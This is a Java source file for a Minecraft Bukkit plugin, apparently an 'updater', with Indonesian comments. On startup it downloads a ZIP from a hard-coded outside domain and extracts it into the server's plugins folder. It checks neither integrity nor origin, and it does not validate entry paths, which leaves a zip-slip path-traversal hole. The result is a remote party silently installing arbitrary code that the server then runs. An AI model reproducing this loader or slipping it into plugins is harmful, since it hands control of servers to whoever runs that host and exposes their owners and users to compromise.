package root.hypster;
import java.io.*;
import java.net.URL;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import org.bukkit.plugin.java.JavaPlugin;

public class Hypster_Updater extends JavaPlugin {

    public void onEnable() {
        String zipUrl = "https://lynxteam.xyz/update/plugins.zip"; // URL dari file ZIP yang akan didownload
        String zipName = "plugins.zip"; // Nama file ZIP yang akan didownload dan diekstraksi
        int maxRetries = 15; // Jumlah maksimum percobaan download

        File pluginsFolder = getDataFolder().getParentFile(); // Folder "plugins" dari server Minecraft
        File zipFile = new File(pluginsFolder, zipName); // File ZIP yang akan didownload dan diekstraksi

        int retryCount = 0; // Hitung jumlah percobaan download
        while (!zipFile.exists() && retryCount < maxRetries) {
            retryCount++;
            getLogger().info("Percobaan ke-" + retryCount + " untuk mendownload file ZIP...");

            // Download file ZIP dari URL
            try (BufferedInputStream in = new BufferedInputStream(new URL(zipUrl).openStream());
                 FileOutputStream out = new FileOutputStream(zipFile)) {
                byte[] dataBuffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                    out.write(dataBuffer, 0, bytesRead);
                }
            } catch (IOException e) {
                getLogger().warning("Gagal mendownload file ZIP: " + e.getMessage());
                try {
                    Thread.sleep(2500); // Jeda waktu 2,5 detik sebelum mencoba lagi
                } catch (InterruptedException ex) {
                    getLogger().warning("Gagal memberikan jeda waktu: " + ex.getMessage());
                }
            }
        }

        if (!zipFile.exists()) {
            getLogger().warning("Gagal mendownload file ZIP setelah " + maxRetries + " percobaan.");
            return;
        }

        // Ekstraksi file ZIP ke folder "plugins"
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFile))) {
            ZipEntry entry = zis.getNextEntry();
            while (entry != null) {
                String fileName = entry.getName();
                File file = new File(pluginsFolder, fileName);
                if (entry.isDirectory()) {
                    file.mkdirs();
                } else {
                    File parent = file.getParentFile();
                    if (parent != null) {
                        parent.mkdirs();
                    }
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        byte[] buffer = new byte[1024];
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
                entry = zis.getNextEntry();
            }
        } catch (IOException e) {
            getLogger().warning("Gagal mengekstraksi file ZIP: " + e.getMessage());
            return;
        }

        // Hapus file ZIP yang telah diekstraksi
        if (zipFile.delete()) {
            getLogger().info("File ZIP berhasil dihapus.");
        } else {
            getLogger().warning("Gagal menghapus file ZIP.");
        }

        getLogger().info("File ZIP berhasil didownload dan diekstraksi.");
    }

}
